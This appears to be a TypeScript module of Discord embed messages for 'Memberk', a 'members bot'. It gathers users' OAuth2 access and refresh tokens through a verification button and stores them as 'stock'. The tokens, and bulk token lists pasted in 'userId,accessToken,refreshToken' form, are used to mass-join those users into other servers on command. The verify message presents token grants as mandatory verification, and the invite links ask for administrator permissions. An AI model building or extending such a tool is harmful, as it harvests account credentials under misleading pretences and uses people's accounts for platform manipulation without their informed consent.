import {
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  type Client,
} from "discord.js";
import {
  CLIENT_ID,
  CLIENT_3_ID,
  COLOR,
  HARDCODED_OWNERS,
  MAX_ROLES_PER_GUILD,
  SUPER_OWNER_ID,
  getPublicDomain,
} from "../config.js";
import { readChannelLocks } from "../storage/locks.js";
import { getGuildOwnerRoles } from "../storage/owners.js";
import { getGuildRoleLimits } from "../storage/roles.js";
import { readDailyRestock, readScheduledRestocks } from "../storage/schedules.js";
import { readAuthUsers, readStoredTokens } from "../storage/tokens.js";
import { listAllowedGuilds } from "../storage/allowedGuilds.js";
import { listBlacklisted } from "../storage/blacklist.js";
import { getAutoPing } from "../storage/autoping.js";

function now(): Date {
  return new Date();
}

// ─── Help / OAuth ─────────────────────────────────────────────────────────────

export function helpEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("🤖 Memberk — All Commands")
    .setColor(COLOR.blurple)
    .setTimestamp(now())
    .addFields(
      {
        name: "🔐 Authentication",
        value:
          "`/auth code:CODE` — Manually authenticate with a code\n" +
          "`/check_tokens` — Validate all stored tokens (owners only)",
      },
      {
        name: "🚀 Mass Joining",
        value:
          "`/djoin server_id:ID` — Add all stock users to a server (owners only)\n" +
          "`/servers` — List all servers the bot is in\n" +
          "`/server_age [server_id]` — Check when a server was joined\n" +
          "`/cleanup_servers` — Leave all non-main servers (owners only)",
      },
      {
        name: "📦 Stock & Users",
        value:
          "`/stock` — Show current bulk stock count\n" +
          "`/count` — Show stored token count\n" +
          "`/list_users` — List all authenticated users\n" +
          "`/restock [count]` — Move stored tokens into bulk stock (owners only)\n" +
          "`/clear_stock` — Wipe all bulk stock (owners only)",
      },
      {
        name: "📅 Schedules",
        value:
          "`/schedule_restock time:1h` — Schedule a one-off restock (owners only)\n" +
          "`/list_schedules` — View pending schedules (owners only)\n" +
          "`/cancel_schedule id:ID` — Cancel a schedule (owners only)\n" +
          "`/set_daily_restock time:14:00` — Set a daily restock (owners only)\n" +
          "`/cancel_daily_restock` — Cancel the daily restock (owners only)\n" +
          "`/daily_restock_status` — Show daily restock config (owners only)",
      },
      {
        name: "👑 Owner Management",
        value:
          "`/owners` — List all owners\n" +
          "`/control_panel` — Open the interactive control panel\n" +
          "`/setowner_role role:@Role` — Grant owner access by role\n" +
          "`/removeowner_role role:@Role` — Revoke an owner role\n" +
          "`/listowner_roles` — List all owner roles\n" +
          "`/restart` — Restart the bot process\n" +
          "`/deploy` — Trigger a Railway redeploy\n" +
          "`/dashboard` — Get the private dashboard link",
      },
      {
        name: "🎭 Role Limits & 📌 Channel Locks",
        value:
          "`/setrole role:@Role limit:N` — Set per-role djoin limit\n" +
          "`/removerole role:@Role` — Remove a role limit\n" +
          "`/listroles` — List all role limits\n" +
          "`/setchannel type:djoin channel:#ch` — Lock a command to a channel\n" +
          "`/clearchannel type:djoin` — Remove a channel lock\n" +
          "`/listchannels` — Show all channel locks",
      },
      {
        name: "📺 Live Embeds",
        value:
          "`/live_stock` — Post a live-updating stock embed (owners only)\n" +
          "`/live_status` — Post a live-updating status embed (owners only)",
      },
      {
        name: "🔔 Auto-ping",
        value:
          "`/autoping_set channel:#ch` — Ping new members in a channel\n" +
          "`/autoping_clear` — Disable auto-ping\n" +
          "`/autoping_status` — Show current auto-ping config\n" +
          "`/autoping_test` — Send a test ping for yourself",
      },
      {
        name: "📣 Gecko Announcements",
        value:
          "`/setup_subscribe` — Post the opt-in subscribe embed\n" +
          "`/announce message:...` — DM all subscribers\n" +
          "`/subscribers` — Count subscribers in this server",
      },
      {
        name: "✅ Verification (Bot 2)",
        value:
          "`/send_verify [channel] [image]` — Post the verification embed (owners only)\n" +
          "_Run this command from Bot 2 in your verify channel._",
      },
      {
        name: "🔧 Utility",
        value:
          "`/invite` — Bot 1 invite link\n" +
          "`/add` — Add Bot 3 to a server\n" +
          "`/status` — Bot status & uptime\n" +
          "`/help` — Show this message",
      },
      {
        name: "🚫 Super-owner Only",
        value:
          "`/blacklist user_id:ID` · `/unblacklist` · `/blacklist_list`\n" +
          "`/enable_server` · `/disable_server` · `/list_allowed_servers`",
      },
      {
        name: "⚠️ Notes",
        value:
          "• Bot auto-leaves servers after 14 days\n" +
          "• Prefix `!` versions work for most commands\n" +
          "• Owner-only commands require owner role or hardcoded owner ID",
      },
    );
}

export function verifyEmbed(imageUrl?: string | null): {
  embed: EmbedBuilder;
  components: ActionRowBuilder<ButtonBuilder>[];
} {
  const domain = getPublicDomain() ?? `http://localhost:${process.env.PORT ?? 5000}`;
  const url = `${domain}/verify`;
  const embed = new EmbedBuilder()
    .setDescription(
      "✅ **Memberk Official Verification** ✅\n\n" +
        "✅ Verify or no restocks! ( Cannot farm members too )",
    )
    .setColor(0xf59e0b);
  if (imageUrl) {
    embed.setImage(imageUrl);
  }
  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setLabel("Verify")
      .setStyle(ButtonStyle.Link)
      .setURL(url),
  );
  return { embed, components: [row] };
}


export function authSuccessDmEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("✅ You're Authorized!")
    .setDescription(
      "You have been **successfully authorized**.\n\n" +
        "🛡️ **Only use `/djoin` in Memberk.** Any other server " +
        "claiming to use this bot is a **scam** — do not trust it.\n\n" +
        "📦 `/djoin` only works **when there is stock available**. " +
        "If stock is empty, wait for a restock before trying.",
    )
    .setColor(COLOR.green)
    .setTimestamp(now())
    .setFooter({ text: "Memberk • Authorization confirmed" });
}

// ─── Stock / users / status ───────────────────────────────────────────────────

export function countEmbed(): EmbedBuilder {
  const stored = readStoredTokens().length;
  const stock = readAuthUsers().length;
  return new EmbedBuilder()
    .setTitle("📊 Stored Tokens")
    .setDescription(
      `There are currently **${stored}** stored tokens (from individual ` +
        "OAuth authorizations).\n" +
        `Bulk stock contains **${stock}** tokens. Use \`/stock\` to see stock.`,
    )
    .setColor(COLOR.blurple)
    .setTimestamp(now());
}

export function listUsersEmbed(): { embed: EmbedBuilder; empty: boolean } {
  const users = readStoredTokens();
  if (users.length === 0) {
    return {
      embed: new EmbedBuilder()
        .setDescription("❌ No authenticated users found.")
        .setColor(COLOR.red),
      empty: true,
    };
  }
  let desc = "";
  for (const u of users) {
    const line = `• <@${u.userId}> (\`${u.userId}\`)\n`;
    if (desc.length + line.length > 3900) {
      desc += "…and more";
      break;
    }
    desc += line;
  }
  return {
    embed: new EmbedBuilder()
      .setTitle(`👥 Authenticated Users (${users.length})`)
      .setDescription(desc)
      .setColor(COLOR.blurple)
      .setTimestamp(now()),
    empty: false,
  };
}

export function stockEmbed(): EmbedBuilder {
  const count = readAuthUsers().length;
  const has = count > 0;
  return new EmbedBuilder()
    .setTitle(has ? "✅ Stock Available" : "❌ Out of Stock")
    .setDescription(
      has
        ? `There are currently **${count}** tokens in stock and ready to use.`
        : "There are **no tokens** in stock.\n\nTokens are added automatically when users verify via the verification channel.",
    )
    .setColor(has ? COLOR.green : COLOR.red)
    .setTimestamp(now())
    .addFields({ name: "📦 Tokens in Stock", value: String(count), inline: true });
}

export function statusEmbed(client: Client, botStartTime: Date | null): EmbedBuilder {
  const online = client.user !== null;
  let uptime = "Unknown";
  if (botStartTime) {
    const ms = Date.now() - botStartTime.getTime();
    const total = Math.floor(ms / 1000);
    const d = Math.floor(total / 86400);
    const h = Math.floor((total % 86400) / 3600);
    const m = Math.floor((total % 3600) / 60);
    uptime = `${d}d ${h}h ${m}m`;
  }
  const stock = readAuthUsers().length;
  const e = new EmbedBuilder()
    .setTitle(online ? "🟢 Bot Online" : "🔴 Bot Offline")
    .setColor(online ? COLOR.green : COLOR.red)
    .setTimestamp(now())
    .addFields(
      { name: "📡 Status", value: online ? "Online" : "Offline", inline: true },
      { name: "⏱️ Uptime", value: uptime, inline: true },
      { name: "🌐 Servers", value: String(client.guilds.cache.size), inline: true },
      { name: "📦 Tokens in Stock", value: String(stock), inline: true },
      {
        name: "🏷️ Bot Tag",
        value: client.user ? client.user.tag : "Unknown",
        inline: true,
      },
    );
  if (client.user) {
    const url = client.user.displayAvatarURL();
    if (url) e.setThumbnail(url);
  }
  return e;
}

// ─── Servers ──────────────────────────────────────────────────────────────────

export function serversEmbed(
  client: Client,
  serverJoinTimes: Map<string, Date>,
): EmbedBuilder {
  const guilds = [...client.guilds.cache.values()];
  if (guilds.length === 0) {
    return new EmbedBuilder()
      .setDescription("❌ Bot is not in any servers.")
      .setColor(COLOR.red);
  }
  const lines: string[] = [];
  const nowMs = Date.now();
  for (const g of guilds) {
    const joined = serverJoinTimes.get(g.id);
    const age = joined
      ? `${Math.floor((nowMs - joined.getTime()) / 86_400_000)}d`
      : "?";
    lines.push(
      `• **${g.name}** (\`${g.id}\`) — ${g.memberCount} members — ${age} ago`,
    );
  }
  let body = lines.slice(0, 20).join("\n");
  if (lines.length > 20) body += `\n…and ${lines.length - 20} more`;
  return new EmbedBuilder()
    .setTitle(`🌐 Servers (${guilds.length})`)
    .setDescription(body)
    .setColor(COLOR.blurple)
    .setTimestamp(now());
}

export function serverAgeEmbed(
  serverId: string | null,
  client: Client,
  serverJoinTimes: Map<string, Date>,
): EmbedBuilder {
  if (serverId) {
    const guild = /^\d+$/.test(serverId) ? client.guilds.cache.get(serverId) : null;
    if (!guild) {
      return new EmbedBuilder()
        .setDescription(`❌ Bot is not in server \`${serverId}\`.`)
        .setColor(COLOR.red);
    }
    const joined = serverJoinTimes.get(guild.id);
    const days = joined
      ? Math.floor((Date.now() - joined.getTime()) / 86_400_000)
      : null;
    return new EmbedBuilder()
      .setTitle(`📅 Server Age: ${guild.name}`)
      .setDescription(
        days !== null
          ? `Bot has been in this server for **${days} day(s)**.`
          : "Join time unknown.",
      )
      .setColor(days !== null && days >= 14 ? COLOR.red : COLOR.green)
      .setTimestamp(now())
      .addFields(
        { name: "Server ID", value: `\`${guild.id}\``, inline: true },
        { name: "Members", value: String(guild.memberCount), inline: true },
        { name: "Days", value: days !== null ? String(days) : "?", inline: true },
        {
          name: "Status",
          value:
            days !== null && days >= 14 ? "⚠️ Will leave soon" : "✅ OK",
          inline: true,
        },
      );
  }

  const lines: string[] = [];
  for (const g of client.guilds.cache.values()) {
    const joined = serverJoinTimes.get(g.id);
    const days = joined
      ? Math.floor((Date.now() - joined.getTime()) / 86_400_000)
      : null;
    const flag = days !== null && days >= 14 ? "⚠️" : "✅";
    lines.push(`${flag} **${g.name}** — ${days !== null ? days : "?"}d`);
  }
  return new EmbedBuilder()
    .setTitle("📅 Server Ages")
    .setDescription(lines.length ? lines.join("\n") : "No servers found.")
    .setColor(COLOR.blurple)
    .setTimestamp(now());
}

export function inviteEmbed(): EmbedBuilder {
  const url =
    `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}` +
    `&permissions=8&scope=bot%20applications.commands`;
  return new EmbedBuilder()
    .setTitle("🔗 Bot Invite Link")
    .setDescription(`[👉 Click here to invite the bot](${url})`)
    .setColor(COLOR.blurple)
    .setTimestamp(now());
}

export function addEmbed(_client: Client): {
  components: ActionRowBuilder<ButtonBuilder>[];
} {
  const id = CLIENT_3_ID || CLIENT_ID;
  const invite =
    `https://discord.com/oauth2/authorize?client_id=${id}` +
    `&permissions=8&scope=bot%20applications.commands`;
  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setLabel("Add Bot")
      .setStyle(ButtonStyle.Link)
      .setURL(invite),
  );
  return { components: [row] };
}

// ─── Owners / roles / channels ────────────────────────────────────────────────

export function ownersEmbed(guildOwnerId: string, guildId: string): EmbedBuilder {
  const ownerRoles = getGuildOwnerRoles(guildId);
  const lines: string[] = [
    `👑 <@${guildOwnerId}> — **Server Owner** (permanent)`,
    "\n**Global Owners** (hardcoded — full access in every server):",
  ];
  for (const oid of HARDCODED_OWNERS) lines.push(`⭐ <@${oid}>`);
  if (ownerRoles.length) {
    lines.push("\n**Owner Roles** (anyone with these roles gets owner access):");
    for (const rid of ownerRoles) lines.push(`🛡️ <@&${rid}>`);
  } else {
    lines.push("\n*No owner roles configured.*");
    lines.push("Use `/setowner_role` or `!setowner_role @role` to add one.");
  }
  return new EmbedBuilder()
    .setTitle("👑 Owner Access List")
    .setDescription(lines.join("\n"))
    .setColor(COLOR.blurple)
    .setTimestamp(now())
    .setFooter({
      text: `${HARDCODED_OWNERS.length} global owner(s) • ${ownerRoles.length} owner role(s)`,
    });
}

export function ownerRolesEmbed(guildId: string): EmbedBuilder {
  const roles = getGuildOwnerRoles(guildId);
  if (roles.length === 0) {
    return new EmbedBuilder()
      .setTitle("🛡️ Owner Roles")
      .setDescription(
        "No owner roles configured.\n\n" +
          "Use `/setowner_role` or `!setowner_role @role` to grant owner-level " +
          "access to everyone with a specific role.\n\n" +
          "*Tip:* role-based ownership survives bot restarts and redeploys.",
      )
      .setColor(COLOR.yellow)
      .setTimestamp(now());
  }
  return new EmbedBuilder()
    .setTitle(`🛡️ Owner Roles (${roles.length})`)
    .setDescription(roles.map((r) => `🛡️ <@&${r}>`).join("\n"))
    .setColor(COLOR.blurple)
    .setTimestamp(now())
    .setFooter({
      text: "Anyone with one of these roles can use owner-only commands",
    });
}

export function roleLimitsEmbed(guildId: string): EmbedBuilder {
  const limits = getGuildRoleLimits(guildId);
  const entries = Object.entries(limits);
  if (entries.length === 0) {
    return new EmbedBuilder()
      .setTitle("🎭 Role djoin Limits")
      .setDescription(
        "No role limits configured.\n" +
          "Use `/setrole` or `!setrole ROLE_ID LIMIT` to add one.",
      )
      .setColor(COLOR.yellow)
      .setTimestamp(now());
  }
  return new EmbedBuilder()
    .setTitle(`🎭 Role djoin Limits (${entries.length}/${MAX_ROLES_PER_GUILD})`)
    .setDescription(
      entries.map(([rid, lim]) => `• <@&${rid}> — **${lim}** members`).join("\n"),
    )
    .setColor(COLOR.blurple)
    .setTimestamp(now())
    .setFooter({ text: `Max ${MAX_ROLES_PER_GUILD} roles per server` });
}

export function channelLocksEmbed(guildId: string): EmbedBuilder {
  const locks = readChannelLocks()[guildId] ?? {};
  if (!locks.djoin && !locks.auth) {
    return new EmbedBuilder()
      .setTitle("📌 Channel Locks")
      .setDescription(
        "No channel locks set.\n" +
          "Use `/setchannel` to restrict commands to specific channels.",
      )
      .setColor(COLOR.yellow)
      .setTimestamp(now());
  }
  return new EmbedBuilder()
    .setTitle("📌 Channel Locks")
    .setColor(COLOR.blurple)
    .setTimestamp(now())
    .addFields(
      {
        name: "🚀 djoin",
        value: locks.djoin ? `<#${locks.djoin}>` : "Not locked",
        inline: true,
      },
      {
        name: "🔐 auth",
        value: locks.auth ? `<#${locks.auth}>` : "Not locked",
        inline: true,
      },
    );
}

export function autoPingStatusEmbed(guildId: string): EmbedBuilder {
  const cfg = getAutoPing(guildId);
  if (!cfg) {
    return new EmbedBuilder()
      .setTitle("👋 Auto-Ping")
      .setDescription(
        "Auto-ping is **disabled** for this server.\n" +
          "Use `/autoping_set` to turn it on.",
      )
      .setColor(COLOR.yellow)
      .setTimestamp(now());
  }
  return new EmbedBuilder()
    .setTitle("👋 Auto-Ping")
    .setColor(COLOR.green)
    .setTimestamp(now())
    .addFields(
      { name: "Channel", value: `<#${cfg.channelId}>`, inline: true },
      {
        name: "Role Mention",
        value: cfg.mentionRoleId ? `<@&${cfg.mentionRoleId}>` : "None",
        inline: true,
      },
      { name: "Message Template", value: `\`\`\`${cfg.message}\`\`\`` },
      {
        name: "Placeholders",
        value:
          "`{user}` — mention the new member\n" +
          "`{username}` — their name (no ping)\n" +
          "`{server}` — server name\n" +
          "`{count}` — current member count",
      },
    );
}

// ─── Reusable deny / error embeds ─────────────────────────────────────────────

export function denyEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("❌ Access Denied")
    .setDescription(
      "Only the **server owner** or an **extra owner** can use this command.",
    )
    .setColor(COLOR.red);
}

export function denyRealOwnerEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("❌ Access Denied")
    .setDescription("Only the **real server owner** can use this command.")
    .setColor(COLOR.red);
}

export function denySuperOwnerEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("🔒 Private Command")
    .setDescription(
      "This command can only be used by the **bot's super-owner**.",
    )
    .setColor(COLOR.red);
}

export function blacklistedEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("⛔ You Are Blacklisted")
    .setDescription(
      "You have been **blacklisted** from using this bot.\n\n" +
        "If you think this is a mistake, contact the bot's super-owner.",
    )
    .setColor(COLOR.red);
}

export function blacklistListEmbed(): EmbedBuilder {
  const users = listBlacklisted();
  if (users.length === 0) {
    return new EmbedBuilder()
      .setTitle("⛔ Blacklist")
      .setDescription("No users are blacklisted.")
      .setColor(COLOR.yellow)
      .setTimestamp(now());
  }
  const lines = users.map((u) => `• <@${u}> (\`${u}\`)`);
  return new EmbedBuilder()
    .setTitle(`⛔ Blacklist (${users.length})`)
    .setDescription(lines.join("\n"))
    .setColor(COLOR.red)
    .setTimestamp(now())
    .setFooter({
      text: "Use /unblacklist user_id:ID to remove someone",
    });
}

export function allowedGuildsEmbed(mainGuildId: string): EmbedBuilder {
  const extras = listAllowedGuilds();
  const lines = [
    `🏠 \`${mainGuildId}\` — **main server** (always allowed)`,
  ];
  if (extras.length === 0) {
    lines.push("\n*No extra servers enabled.*");
    lines.push(
      "Use `/enable_server server_id:ID` to allow another server to use this bot.",
    );
  } else {
    lines.push("\n**Extra enabled servers:**");
    for (const g of extras) lines.push(`• \`${g}\``);
  }
  return new EmbedBuilder()
    .setTitle(`✅ Allowed Servers (${extras.length + 1})`)
    .setDescription(lines.join("\n"))
    .setColor(COLOR.blurple)
    .setTimestamp(now());
}

export function noTokensEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("⚠️ No Tokens Provided")
    .setDescription(
      "You must provide tokens to restock.\n\n" +
        "**Slash command:** Use the `file` or `tokens` option\n" +
        "**Prefix command:** Attach a `.txt` file OR paste tokens after `!restock`\n\n" +
        "**Token format (one per line):**\n```userId,accessToken,refreshToken```",
    )
    .setColor(COLOR.yellow);
}

export function notAuthedEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("🔐 Not Authenticated")
    .setDescription(
      "You must authorize before you can use `/djoin` or `!djoin`.\n\n" +
        "**How to authorize:**\n" +
        "1. Go to the verification channel and click **Verify**\n" +
        "2. Click **Authorize** on the Discord page\n" +
        "3. You'll be authorized automatically and DM'd a confirmation\n\n" +
        "(Alternatively, use `/auth code:YOUR_CODE` if you copied a code instead.)",
    )
    .setColor(COLOR.red);
}

export function channelLockedEmbed(channelId: string, cmd: string): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("📌 Wrong Channel")
    .setDescription(
      `The \`${cmd}\` command is locked to <#${channelId}>.\n\nPlease use it there.`,
    )
    .setColor(COLOR.yellow);
}

export function wrongGuildEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("🚫 Wrong Server")
    .setDescription(
      "Memberk bot commands **only work in the official Memberk server**.\n\n" +
        "🛡️ Any other server claiming to use this bot is a **scam** — do not trust it.",
    )
    .setColor(COLOR.red);
}

export function dashboardEmbed(): EmbedBuilder {
  const domain = getPublicDomain() ?? "http://localhost:3000";
  const url = `${domain}/dashboard/`;
  return new EmbedBuilder()
    .setTitle("🖥️ Owner Dashboard")
    .setDescription(
      "Here is your private link to the **Members Bot Dashboard**.\n\n" +
        `[👉 Open Dashboard](${url})\n\n` +
        "**What you can do:**\n" +
        "• View bot stats and connected servers\n" +
        "• Manage stored OAuth2 tokens\n" +
        "• Run and monitor mass joins\n" +
        "• Configure role limits and channel locks\n" +
        "• Manage extra owners\n\n" +
        "⚠️ **Keep this link private.** Sign in using your bot token.",
    )
    .setColor(COLOR.blurple)
    .setURL(url)
    .setTimestamp(now())
    .setFooter({ text: "Only visible to you • Dashboard sessions last 8 hours" });
}

// ─── Daily / scheduled restocks ───────────────────────────────────────────────

export function dailyRestockStatusEmbed(): EmbedBuilder {
  const config = readDailyRestock();
  if (!config) {
    return new EmbedBuilder()
      .setTitle("📅 Daily Restock")
      .setDescription(
        "No daily restock configured.\nUse `/set_daily_restock` to set one up.",
      )
      .setColor(COLOR.yellow)
      .setTimestamp(now());
  }
  const tokenCount = config.rawTokens
    .split(/\r?\n/)
    .filter((l) => l.trim()).length;
  const today = new Date().toISOString().slice(0, 10);
  const ranToday = config.lastRanDate === today;
  return new EmbedBuilder()
    .setTitle("📅 Daily Restock Active")
    .setColor(COLOR.blurple)
    .setTimestamp(now())
    .addFields(
      { name: "⏰ Time (MST)", value: config.time ?? "?", inline: true },
      { name: "📦 Tokens", value: String(tokenCount), inline: true },
      { name: "✅ Ran Today", value: ranToday ? "Yes" : "No", inline: true },
      { name: "📆 Last Ran", value: config.lastRanDate ?? "Never", inline: true },
      { name: "👤 Set By", value: `<@${config.createdBy}>`, inline: true },
    )
    .setFooter({ text: "Use /cancel_daily_restock to remove" });
}

export function listSchedulesEmbed(): EmbedBuilder {
  const schedules = readScheduledRestocks();
  if (schedules.length === 0) {
    return new EmbedBuilder()
      .setTitle("📅 Scheduled Restocks")
      .setDescription(
        "No pending scheduled restocks.\nUse `/schedule_restock` to add one.",
      )
      .setColor(COLOR.yellow)
      .setTimestamp(now());
  }
  const nowMs = Date.now();
  const lines = schedules.map((s) => {
    const remaining = s.runAt - nowMs;
    let timeStr: string;
    if (remaining > 0) {
      const mins = Math.floor(remaining / 60_000);
      timeStr =
        mins >= 60
          ? `in ${Math.floor(mins / 60)}h ${mins % 60}m`
          : `in ${mins}m`;
    } else {
      timeStr = "running soon...";
    }
    const tokenCount = s.rawTokens.split(/\r?\n/).filter((l) => l.trim()).length;
    return `• \`${s.id}\` — **${tokenCount} tokens** — ${timeStr} — <@${s.createdBy}>`;
  });
  return new EmbedBuilder()
    .setTitle(`📅 Scheduled Restocks (${schedules.length})`)
    .setDescription(lines.join("\n"))
    .setColor(COLOR.blurple)
    .setTimestamp(now())
    .setFooter({ text: "Use /cancel_schedule id:ID to cancel one" });
}

// ─── Announcements (Gecko) ────────────────────────────────────────────────────

export function subscribePanelEmbed(guildName: string): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle("📣 Announcement Subscriptions")
    .setDescription(
      `Want to get **${guildName}** announcements as a DM?\n\n` +
        "Click **Subscribe** below to opt in. You can click **Unsubscribe** " +
        "anytime to stop. We'll only DM you when an admin posts an announcement.",
    )
    .setColor(COLOR.green)
    .setFooter({ text: "Gecko • Opt-in announcements" });
}

export function announcementDmEmbed(guildName: string, message: string): EmbedBuilder {
  return new EmbedBuilder()
    .setTitle(`📣 Announcement from ${guildName}`)
    .setDescription(message)
    .setColor(COLOR.blurple)
    .setFooter({
      text: "You opted in. Click Unsubscribe on the embed in the server to stop.",
    });
}
